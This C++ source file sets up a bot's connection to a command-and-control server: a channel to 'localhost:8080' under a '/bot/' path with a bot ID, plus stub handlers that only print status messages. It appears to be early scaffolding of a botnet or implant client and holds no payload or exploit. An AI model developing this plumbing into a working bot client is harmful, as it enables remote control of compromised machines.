//
// Created by alsah on 16.03.23.
//

#include "ConnectionsManager.h"
#include <utility>



ConnectionsManager::ConnectionsManager(ConnectionsManagerConfiguration config) : config(std::move(config)) {


    C2ServerChannelConfiguration cfg( // TODO add valid handlers
            [this](){
                std::cout << "c2Server channel closed";
                },
            [this](){
                std::cout << "c2Server channel opened";
                },
            [this](const std::vector<std::byte>& data){
                std::cout << "c2Server channel received message";
                },
                60
            );
    c2ServerChannel = std::make_unique<C2ServerChannel>(cfg);
}

ConnectionsManager::~ConnectionsManager() {
    c2ServerChannel->close();
}

void ConnectionsManager::start() {
    config.c2server = "localhost:8080"; // TODO something with config
    c2ServerChannel->open(config.c2server, "/bot/" + config.botId, true);
}

void ConnectionsManager::stop() {
    c2ServerChannel->close();
}
